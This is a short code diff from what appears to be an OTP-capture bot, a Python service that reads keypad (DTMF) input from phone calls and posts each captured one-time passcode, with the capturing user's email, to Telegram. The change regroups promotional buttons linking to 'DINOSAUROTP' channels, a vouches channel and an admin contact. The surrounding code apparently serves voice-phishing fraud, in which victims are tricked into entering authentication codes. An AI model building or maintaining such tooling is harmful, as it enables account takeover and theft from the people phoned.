@@ -2263,11 +2263,16 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
 ┣ 📍 OTP ({otp_digits}): {captured_code}
 ┗ Captured By: {user_email_censored}"""
                 
-                # Create inline buttons
+                # Create inline buttons (2 rows)
                 buttons = [
-                    {"text": "DINOSAUROTP Channel", "url": "https://t.me/DINOSAUROTP"},
-                    {"text": "Discussion", "url": "https://t.me/DINOSAUROTPDISCUSSION"},
-                    {"text": "Vouches", "url": "https://t.me/DINOSAUROTPVOUCHES"}
+                    [
+                        {"text": "DINOSAUROTP Channel", "url": "https://t.me/DINOSAUROTP"},
+                        {"text": "Discussion", "url": "https://t.me/DINOSAUROTPDISCUSSlON"}
+                    ],
+                    [
+                        {"text": "Vouches", "url": "https://t.me/DINOSAUROTPVOUCHES"},
+                        {"text": "Contact Admin", "url": "https://t.me/TTGamik"}
+                    ]
                 ]
                 
                 asyncio.create_task(send_telegram_message(telegram_message, buttons))
